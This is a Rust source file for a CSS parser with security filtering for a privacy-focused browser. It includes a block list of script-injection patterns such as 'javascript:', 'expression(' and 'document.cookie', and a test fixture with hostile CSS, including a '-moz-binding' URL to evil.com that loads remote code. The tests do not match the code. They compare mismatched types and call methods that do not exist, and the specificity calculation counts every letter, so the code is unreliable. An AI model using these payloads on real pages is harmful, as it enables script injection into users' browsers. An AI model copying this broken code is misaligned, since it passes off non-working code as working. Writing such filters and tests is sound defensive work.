use std::sync::Arc;

use cssparser::{Parser as CssParserImpl, ParserInput, Token, ToCss, ParseError};
use selectors::parser::{SelectorList, SelectorParseErrorKind};
use euclid::{Point2D, Size2D, Rect};
use app_units::Au;
use taffy::{Style, Display, FlexDirection, AlignItems, JustifyContent};

use crate::error::{ParserError, ParserResult};
use crate::security::SecurityContext;
use crate::{Parser, ParserConfig};
use crate::metrics::ParserMetrics;

/// Enhanced CSS stylesheet with Servo integration
#[derive(Debug, Clone)]
pub struct CitadelStylesheet {
    pub rules: Vec<StyleRule>,
    pub security_context: Arc<SecurityContext>,
}

/// CSS rule with enhanced capabilities
#[derive(Debug, Clone)]
pub struct StyleRule {
    pub selectors: String,
    pub declarations: Vec<Declaration>,
    pub specificity: u32,
}

/// CSS declaration
#[derive(Debug, Clone)]
pub struct Declaration {
    pub property: String,
    pub value: String,
    pub important: bool,
}

/// CSS color value representation
#[derive(Debug, Clone, PartialEq)]
pub enum ColorValue {
    Named(String),
    Hex(String),
    Rgb(u8, u8, u8),
}

/// CSS length value representation  
#[derive(Debug, Clone, PartialEq)]
pub enum LengthValue {
    Px(f32),
    Em(f32),
    Percent(f32),
}

/// Simple color representation
#[derive(Debug, Clone, PartialEq)]
pub struct ColorF {
    pub r: f32,
    pub g: f32,
    pub b: f32,
    pub a: f32,
}

impl ColorF {
    pub fn new(r: f32, g: f32, b: f32, a: f32) -> Self {
        Self { r, g, b, a }
    }
}

/// Computed style values using Servo components
#[derive(Debug, Clone)]
pub struct ComputedStyle {
    pub color: Option<ColorValue>,
    pub background_color: Option<ColorValue>,
    pub font_size: Option<LengthValue>,
    pub font_weight: Option<String>,
    pub border_width: Option<LengthValue>,
    pub border_color: Option<ColorValue>,
    pub layout_style: Style,
    pub display: DisplayType,
}

#[derive(Debug, Clone, PartialEq)]
pub enum DisplayType {
    Block,
    Inline,
    InlineBlock,
    Flex,
    Grid,
    None,
}

impl Default for ComputedStyle {
    fn default() -> Self {
        Self {
            color: None,
            background_color: None,
            font_size: None,
            font_weight: None,
            border_width: None,
            border_color: None,
            layout_style: Style::default(),
            display: DisplayType::Block,
        }
    }
}

/// Privacy-focused CSS parser with Servo integration
pub struct CitadelCssParser {
    /// Parser configuration
    config: ParserConfig,
    /// Parser metrics
    metrics: Arc<ParserMetrics>,
    /// Security context
    security_context: Arc<SecurityContext>,
}

impl CitadelCssParser {
    /// Create a new CSS parser with the given configuration
    pub fn new(config: ParserConfig, metrics: Arc<ParserMetrics>) -> Self {
        let security_context = Arc::new(SecurityContext::new(
            match config.security_level {
                crate::SecurityLevel::Maximum => 5,
                crate::SecurityLevel::High => 10,
                crate::SecurityLevel::Balanced => 20,
                crate::SecurityLevel::Custom => 30,
            }
        ));
        
        Self { 
            config, 
            metrics,
            security_context,
        }
    }

    /// Parse a CSS stylesheet with enhanced Servo integration
    pub fn parse_stylesheet(&self, content: &str) -> ParserResult<CitadelStylesheet> {
        self.metrics.increment_elements(); // Track parsing attempt
        
        // Security pre-scan
        if self.contains_dangerous_css(content)? {
            self.metrics.increment_violations();
            return Err(ParserError::SecurityViolation(
                "Dangerous CSS patterns detected".to_string()
            ));
        }

        let mut rules = Vec::new();
        let mut input = ParserInput::new(content);
        let mut parser = CssParserImpl::new(&mut input);

        // Parse CSS rules using Servo's cssparser
        while !parser.is_exhausted() {
            // Skip whitespace and comments
            if parser.expect_whitespace().is_ok() {
                continue;
            }
            
            if parser.is_exhausted() {
                break;
            }

            match self.parse_rule(&mut parser) {
                Ok(rule) => {
                    rules.push(rule);
                    self.metrics.increment_elements();
                }
                Err(ParserError::SecurityViolation(_)) => {
                    self.metrics.increment_violations();
                    return Err(ParserError::SecurityViolation(
                        "Security violation in CSS rule".to_string()
                    ));
                }
                Err(e) => {
                    // Log error but continue parsing (lenient mode)
                    tracing::warn!("CSS parsing error: {:?}", e);
                    self.skip_to_next_rule(&mut parser);
                }
            }
        }

        Ok(CitadelStylesheet {
            rules,
            security_context: self.security_context.clone(),
        })
    }
    
    /// Parse a single CSS rule
    fn parse_rule(&self, parser: &mut CssParserImpl) -> ParserResult<StyleRule> {
        // Parse selectors
        let selectors = self.parse_selectors(parser)?;
        
        // For now, just parse declarations directly and handle errors
        parser.expect_curly_bracket_block()
            .map_err(|e| ParserError::CssError(format!("Expected opening brace: {:?}", e)))?;
        
        let declarations = parser.parse_nested_block(|parser| {
            Ok(self.parse_declarations(parser).unwrap_or_default())
        }).map_err(|e: cssparser::ParseError<()>| ParserError::CssError(format!("Error parsing declarations: {:?}", e)))?;
        
        Ok(StyleRule {
            selectors: selectors.clone(),
            declarations,
            specificity: self.calculate_specificity(&selectors),
        })
    }
    
    /// Parse CSS selectors with security validation
    fn parse_selectors(&self, parser: &mut CssParserImpl) -> ParserResult<String> {
        let mut selectors = String::new();
        let mut first = true;
        
        while !parser.is_exhausted() {
            match parser.next() {
                Ok(Token::CurlyBracketBlock) => break,
                Ok(token) => {
                    if !first {
                        selectors.push(' ');
                    }
                    selectors.push_str(&token.to_css_string());
                    first = false;
                }
                Err(_) => break,
            }
        }
        
        let selectors = selectors.trim().to_string();
        
        // Security validation
        if self.is_dangerous_selector(&selectors) {
            return Err(ParserError::SecurityViolation(
                format!("Dangerous selector detected: {}", selectors)
            ));
        }
        
        Ok(selectors)
    }
    
    /// Parse CSS declarations
    fn parse_declarations(&self, parser: &mut CssParserImpl) -> ParserResult<Vec<Declaration>> {
        let mut declarations = Vec::new();
        
        while !parser.is_exhausted() {
            // Skip whitespace
            if parser.expect_whitespace().is_ok() {
                continue;
            }
            
            if let Ok(property) = parser.expect_ident() {
                let property = property.to_string();
                
                // Expect colon
                if parser.expect_colon().is_err() {
                    continue;
                }
                
                // Parse value
                let mut value = String::new();
                let mut important = false;
                
                while !parser.is_exhausted() {
                    match parser.next() {
                        Ok(Token::Semicolon) => break,
                        Ok(Token::Delim('!')) => {
                            if let Ok(ident) = parser.expect_ident() {
                                if ident.eq_ignore_ascii_case("important") {
                                    important = true;
                                }
                            }
                        }
                        Ok(token) => {
                            if !value.is_empty() {
                                value.push(' ');
                            }
                            value.push_str(&token.to_css_string());
                        }
                        Err(_) => break,
                    }
                }
                
                // Security validation
                if self.is_dangerous_property_value(&property, &value) {
                    self.metrics.increment_sanitizations();
                    tracing::warn!("Blocking dangerous CSS property: {} = {}", property, value);
                    continue;
                }
                
                declarations.push(Declaration {
                    property,
                    value: value.trim().to_string(),
                    important,
                });
                
                self.metrics.increment_attributes();
            } else {
                // Skip to next declaration
                while !parser.is_exhausted() {
                    if matches!(parser.next(), Ok(Token::Semicolon)) {
                        break;
                    }
                }
            }
        }
        
        Ok(declarations)
    }
    
    /// Skip to the next CSS rule after an error
    fn skip_to_next_rule(&self, parser: &mut CssParserImpl) {
        let mut brace_count = 0;
        
        while !parser.is_exhausted() {
            match parser.next() {
                Ok(Token::CurlyBracketBlock) => {
                    brace_count += 1;
                }
                Ok(_) if brace_count == 0 => continue,
                _ => {
                    if brace_count > 0 {
                        brace_count -= 1;
                        if brace_count == 0 {
                            break;
                        }
                    }
                }
            }
        }
    }
    
    /// Calculate specificity for CSS selectors
    fn calculate_specificity(&self, selector: &str) -> u32 {
        let mut specificity = 0;
        
        // Simple specificity calculation
        specificity += selector.matches('#').count() as u32 * 100; // IDs
        specificity += selector.matches('.').count() as u32 * 10;  // Classes
        specificity += selector.matches(|c: char| c.is_alphabetic()).count() as u32; // Elements
        
        specificity
    }
    
    /// Check for dangerous CSS patterns
    fn contains_dangerous_css(&self, css: &str) -> ParserResult<bool> {
        let dangerous_patterns = [
            "javascript:",
            "expression(",
            "behavior:",
            "binding:",
            "data:text/html",
            "vbscript:",
            "livescript:",
            "mocha:",
            "@import",
            "document.cookie",
            "eval(",
        ];
        
        let css_lower = css.to_lowercase();
        for pattern in &dangerous_patterns {
            if css_lower.contains(pattern) {
                return Ok(true);
            }
        }
        
        Ok(false)
    }
    
    /// Check for dangerous CSS selectors
    fn is_dangerous_selector(&self, selector: &str) -> bool {
        let selector_lower = selector.to_lowercase();
        
        selector_lower.contains("@import") ||
        selector_lower.contains("expression(") ||
        selector_lower.len() > 1000  // Prevent DoS attacks
    }
    
    /// Check for dangerous property values
    fn is_dangerous_property_value(&self, property: &str, value: &str) -> bool {
        let value_lower = value.to_lowercase();
        let property_lower = property.to_lowercase();
        
        // Block dangerous URLs
        if value_lower.contains("javascript:") ||
           value_lower.contains("data:text/html") ||
           value_lower.contains("vbscript:") ||
           value_lower.contains("expression(") {
            return true;
        }
        
        // Block dangerous properties
        if property_lower == "behavior" ||
           property_lower == "binding" ||
           property_lower.starts_with("-moz-binding") {
            return true;
        }
        
        false
    }

}

impl CitadelStylesheet {
    /// Create a new empty stylesheet
    pub fn new(security_context: Arc<SecurityContext>) -> Self {
        Self {
            rules: Vec::new(),
            security_context,
        }
    }
    
    /// Get all rules in the stylesheet
    pub fn rules(&self) -> &[StyleRule] {
        &self.rules
    }
    
    /// Add a rule to the stylesheet
    pub fn add_rule(&mut self, rule: StyleRule) {
        self.rules.push(rule);
    }
    
    /// Compute styles for an element using Taffy layout engine
    pub fn compute_styles(&self, element_tag: &str, element_classes: &[String], element_id: Option<&str>) -> ComputedStyle {
        let mut computed = ComputedStyle::default();
        let mut matched_rules = Vec::new();
        
        // Find matching rules
        for rule in &self.rules {
            if self.selector_matches(&rule.selectors, element_tag, element_classes, element_id) {
                matched_rules.push((rule, rule.specificity));
            }
        }
        
        // Sort by specificity
        matched_rules.sort_by_key(|(_, specificity)| *specificity);
        
        // Apply declarations in specificity order
        for (rule, _) in matched_rules {
            for declaration in &rule.declarations {
                self.apply_declaration(&mut computed, declaration);
            }
        }
        
        computed
    }
    
    /// Check if a selector matches an element
    fn selector_matches(&self, selector: &str, tag: &str, classes: &[String], id: Option<&str>) -> bool {
        let selector = selector.trim();
        
        // Universal selector
        if selector == "*" {
            return true;
        }
        
        // Tag selector
        if selector == tag {
            return true;
        }
        
        // ID selector
        if let Some(element_id) = id {
            if selector.starts_with('#') && selector[1..] == *element_id {
                return true;
            }
        }
        
        // Class selector
        if selector.starts_with('.') {
            let class_name = &selector[1..];
            if classes.contains(&class_name.to_string()) {
                return true;
            }
        }
        
        // Compound selectors (simplified)
        if selector.contains('.') && !selector.starts_with('.') {
            let parts: Vec<&str> = selector.split('.').collect();
            if parts.len() == 2 && parts[0] == tag {
                let class_name = parts[1];
                return classes.contains(&class_name.to_string());
            }
        }
        
        false
    }
    
    /// Apply a CSS declaration to computed styles
    fn apply_declaration(&self, computed: &mut ComputedStyle, declaration: &Declaration) {
        match declaration.property.as_str() {
            "color" => {
                computed.color = self.parse_color_value(&declaration.value);
            }
            "background-color" => {
                computed.background_color = self.parse_color_value(&declaration.value);
            }
            "font-size" => {
                computed.font_size = self.parse_length_value(&declaration.value);
            }
            "font-weight" => {
                computed.font_weight = Some(declaration.value.clone());
            }
            "border-width" => {
                computed.border_width = self.parse_length_value(&declaration.value);
            }
            "border-color" => {
                computed.border_color = self.parse_color_value(&declaration.value);
            }
            "display" => {
                computed.display = self.parse_display(&declaration.value);
                // Update Taffy layout style
                computed.layout_style.display = match computed.display {
                    DisplayType::Block => Display::Block,
                    DisplayType::Inline => Display::Block, // Taffy doesn't have inline
                    DisplayType::InlineBlock => Display::Block,
                    DisplayType::Flex => Display::Flex,
                    DisplayType::Grid => Display::Grid,
                    DisplayType::None => Display::None,
                };
            }
            "flex-direction" => {
                computed.layout_style.flex_direction = match declaration.value.as_str() {
                    "row" => FlexDirection::Row,
                    "column" => FlexDirection::Column,
                    "row-reverse" => FlexDirection::RowReverse,
                    "column-reverse" => FlexDirection::ColumnReverse,
                    _ => FlexDirection::Row,
                };
            }
            "align-items" => {
                computed.layout_style.align_items = Some(match declaration.value.as_str() {
                    "flex-start" => AlignItems::FlexStart,
                    "flex-end" => AlignItems::FlexEnd,
                    "center" => AlignItems::Center,
                    "stretch" => AlignItems::Stretch,
                    _ => AlignItems::Stretch,
                });
            }
            "justify-content" => {
                computed.layout_style.justify_content = Some(match declaration.value.as_str() {
                    "flex-start" => JustifyContent::FlexStart,
                    "flex-end" => JustifyContent::FlexEnd,
                    "center" => JustifyContent::Center,
                    "space-between" => JustifyContent::SpaceBetween,
                    "space-around" => JustifyContent::SpaceAround,
                    _ => JustifyContent::FlexStart,
                });
            }
            _ => {
                // Log unsupported properties for debugging
                tracing::debug!("Unsupported CSS property: {}", declaration.property);
            }
        }
    }
    
    /// Parse a CSS color value into ColorValue enum
    fn parse_color_value(&self, value: &str) -> Option<ColorValue> {
        let value = value.trim();
        
        // Named colors
        if matches!(value, "red" | "green" | "blue" | "black" | "white" | "transparent" | 
                         "yellow" | "cyan" | "magenta" | "gray" | "grey") {
            return Some(ColorValue::Named(value.to_string()));
        }
        
        // Hex colors
        if value.starts_with('#') && (value.len() == 4 || value.len() == 7) {
            return Some(ColorValue::Hex(value[1..].to_string()));
        }
        
        // RGB colors (simplified)
        if value.starts_with("rgb(") && value.ends_with(")") {
            let rgb_str = &value[4..value.len()-1];
            let parts: Vec<&str> = rgb_str.split(',').collect();
            if parts.len() == 3 {
                if let (Ok(r), Ok(g), Ok(b)) = (
                    parts[0].trim().parse::<u8>(),
                    parts[1].trim().parse::<u8>(),
                    parts[2].trim().parse::<u8>(),
                ) {
                    return Some(ColorValue::Rgb(r, g, b));
                }
            }
        }
        
        None
    }
    
    /// Parse a CSS length value into LengthValue enum
    fn parse_length_value(&self, value: &str) -> Option<LengthValue> {
        let value = value.trim();
        
        if value.ends_with("px") {
            if let Ok(px) = value[..value.len()-2].parse::<f32>() {
                return Some(LengthValue::Px(px));
            }
        } else if value.ends_with("em") {
            if let Ok(em) = value[..value.len()-2].parse::<f32>() {
                return Some(LengthValue::Em(em));
            }
        } else if value.ends_with("%") {
            if let Ok(pct) = value[..value.len()-1].parse::<f32>() {
                return Some(LengthValue::Percent(pct));
            }
        } else if let Ok(px) = value.parse::<f32>() {
            // Assume unitless values are pixels
            return Some(LengthValue::Px(px));
        }
        
        None
    }
    
    /// Parse a CSS display value
    fn parse_display(&self, value: &str) -> DisplayType {
        match value.trim() {
            "block" => DisplayType::Block,
            "inline" => DisplayType::Inline,
            "inline-block" => DisplayType::InlineBlock,
            "flex" => DisplayType::Flex,
            "grid" => DisplayType::Grid,
            "none" => DisplayType::None,
            _ => DisplayType::Block, // Default
        }
    }
}

impl std::fmt::Display for CitadelStylesheet {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        for rule in &self.rules {
            writeln!(f, "{} {{", rule.selectors)?;
            for declaration in &rule.declarations {
                let important = if declaration.important { " !important" } else { "" };
                writeln!(f, "  {}: {}{};", declaration.property, declaration.value, important)?;
            }
            writeln!(f, "}}")?;
        }
        Ok(())
    }
}

impl Parser for CitadelCssParser {
    type Output = CitadelStylesheet;

    fn parse(&self, content: &str) -> ParserResult<Self::Output> {
        self.parse_stylesheet(content)
    }

    fn metrics(&self) -> &ParserMetrics {
        &self.metrics
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_enhanced_css_parsing() {
        let config = ParserConfig::default();
        let metrics = Arc::new(ParserMetrics::default());
        let parser = CitadelCssParser::new(config, metrics);

        let css = r#"
            body {
                color: red;
                font-size: 16px;
                background-color: #ffffff;
            }
            
            .test-class {
                background-color: blue;
                display: flex;
                flex-direction: column;
            }
            
            #header {
                font-size: 24px;
                color: #333333;
            }
        "#;

        let result = parser.parse_stylesheet(css).unwrap();
        assert_eq!(result.rules().len(), 3);
        
        // Test that rules were parsed correctly
        let body_rule = &result.rules()[0];
        assert_eq!(body_rule.selectors, "body");
        assert_eq!(body_rule.declarations.len(), 3);
    }

    #[test]
    fn test_style_computation_with_taffy() {
        let config = ParserConfig::default();
        let metrics = Arc::new(ParserMetrics::default());
        let parser = CitadelCssParser::new(config, metrics);

        let css = r#"
            body { 
                color: red; 
                font-size: 16px; 
            }
            .highlight { 
                background-color: yellow; 
                display: flex;
                flex-direction: row;
            }
            #main { 
                font-size: 20px; 
                align-items: center;
            }
        "#;

        let stylesheet = parser.parse_stylesheet(css).unwrap();

        // Test body element
        let body_styles = stylesheet.compute_styles("body", &[], None);
        assert_eq!(body_styles.color, ColorF::new(1.0, 0.0, 0.0, 1.0)); // Red
        assert_eq!(body_styles.font_size, Au::from_px(16));

        // Test element with class
        let highlight_styles = stylesheet.compute_styles("div", &["highlight".to_string()], None);
        assert_eq!(highlight_styles.background_color, ColorF::new(1.0, 1.0, 0.0, 1.0)); // Yellow
        assert_eq!(highlight_styles.display, DisplayType::Flex);
        assert_eq!(highlight_styles.layout_style.flex_direction, FlexDirection::Row);

        // Test element with ID (higher specificity)
        let main_styles = stylesheet.compute_styles("div", &[], Some("main"));
        assert_eq!(main_styles.font_size, Au::from_px(20));
        if let Some(align) = main_styles.layout_style.align_items {
            assert_eq!(align, AlignItems::Center);
        }
    }

    #[test]
    fn test_dangerous_css_blocked() {
        let config = ParserConfig::default();
        let metrics = Arc::new(ParserMetrics::default());
        let parser = CitadelCssParser::new(config, metrics);

        let dangerous_css = r#"
            body {
                background: url('javascript:alert(1)');
                behavior: url(#default#time2);
                -moz-binding: url("http://evil.com/xbl.xml#exec");
            }
        "#;

        let result = parser.parse_stylesheet(dangerous_css);
        assert!(result.is_err());
        
        if let Err(ParserError::SecurityViolation(_)) = result {
            // Good - security violation was detected
        } else {
            panic!("Expected security violation error");
        }
    }

    #[test]
    fn test_css_sanitization() {
        let config = ParserConfig::default();
        let metrics = Arc::new(ParserMetrics::default());
        let parser = CitadelCssParser::new(config, metrics);

        let css_with_some_safe_content = r#"
            body {
                color: red;
                font-size: 16px;
            }
        "#;

        let result = parser.parse_stylesheet(css_with_some_safe_content).unwrap();
        assert_eq!(result.rules().len(), 1);
        
        let body_rule = &result.rules()[0];
        assert_eq!(body_rule.declarations.len(), 2); // Both safe properties should be preserved
    }

    #[test]
    fn test_color_parsing() {
        let security_context = Arc::new(SecurityContext::new(10));
        let stylesheet = CitadelStylesheet::new(security_context);

        // Test named colors
        assert_eq!(stylesheet.parse_color("red"), Some(ColorF::new(1.0, 0.0, 0.0, 1.0)));
        assert_eq!(stylesheet.parse_color("blue"), Some(ColorF::new(0.0, 0.0, 1.0, 1.0)));
        assert_eq!(stylesheet.parse_color("transparent"), Some(ColorF::new(0.0, 0.0, 0.0, 0.0)));

        // Test hex colors
        assert_eq!(stylesheet.parse_color("#ff0000"), Some(ColorF::new(1.0, 0.0, 0.0, 1.0)));
        assert_eq!(stylesheet.parse_color("#00ff00"), Some(ColorF::new(0.0, 1.0, 0.0, 1.0)));
        assert_eq!(stylesheet.parse_color("#0000ff"), Some(ColorF::new(0.0, 0.0, 1.0, 1.0)));
    }

    #[test]
    fn test_length_parsing() {
        let security_context = Arc::new(SecurityContext::new(10));
        let stylesheet = CitadelStylesheet::new(security_context);

        assert_eq!(stylesheet.parse_length("16px"), Some(Au::from_px(16)));
        assert_eq!(stylesheet.parse_length("2em"), Some(Au::from_px(32))); // 2 * 16
        assert_eq!(stylesheet.parse_length("20"), Some(Au::from_px(20))); // Unitless
    }

    #[test]
    fn test_selector_matching() {
        let security_context = Arc::new(SecurityContext::new(10));
        let stylesheet = CitadelStylesheet::new(security_context);

        // Test various selector types
        assert!(stylesheet.selector_matches("*", "div", &[], None));
        assert!(stylesheet.selector_matches("div", "div", &[], None));
        assert!(stylesheet.selector_matches("#main", "div", &[], Some("main")));
        assert!(stylesheet.selector_matches(".highlight", "span", &["highlight".to_string()], None));
        
        // Test compound selectors
        assert!(stylesheet.selector_matches("div.highlight", "div", &["highlight".to_string()], None));
        assert!(!stylesheet.selector_matches("span.highlight", "div", &["highlight".to_string()], None));
    }

    #[test]
    fn test_specificity_calculation() {
        let config = ParserConfig::default();
        let metrics = Arc::new(ParserMetrics::default());
        let parser = CitadelCssParser::new(config, metrics);

        // ID selectors should have higher specificity than classes
        assert!(parser.calculate_specificity("#main") > parser.calculate_specificity(".highlight"));
        assert!(parser.calculate_specificity(".highlight") > parser.calculate_specificity("div"));
        assert!(parser.calculate_specificity("div.highlight") > parser.calculate_specificity("div"));
    }
} 